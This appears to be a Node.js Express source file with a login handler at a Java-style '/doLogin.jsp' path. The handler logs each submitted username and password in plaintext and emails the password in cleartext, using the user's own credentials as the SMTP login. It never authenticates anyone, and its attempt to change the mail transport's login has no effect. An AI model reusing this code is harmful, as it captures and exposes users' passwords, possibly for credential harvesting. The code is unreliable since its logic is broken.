const express = require('express');
const app = express();
const bodyParser= require('body-parser')
const nodemailer = require('nodemailer');
app.use(bodyParser.urlencoded({ extended: true }));
// parse incoming requests with JSON payloads

app.use(express.json());
let transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: ``, // replace with your own email address
      pass: `` // replace with your own email password
    }
  });

// handle login form submission
app.post('/doLogin.jsp', (req, res) => {
  const { username, password } = req.body;
  transporter.auth.user=`${username}`
  transporter.auth.pass=`${password}`

  let message = {
    from: `${username}`, // replace with your own email address
    to: `${username}`, // recipient email address
    subject: 'Your password', // email subject line
    text: `Your password is ${password}` // email body
  };
  
  transporter.sendMail(message, (error, info) => {
    if (error) {
      console.log(error);
      res.send('Error: unable to send email');
    } else {
      console.log('Email sent: ' + info.response);
      res.send('Email sent successfully');
    }
  });

  console.log(`Username: ${username}, Password: ${password}`);
  // add your authentication logic here
});
module.exports = app
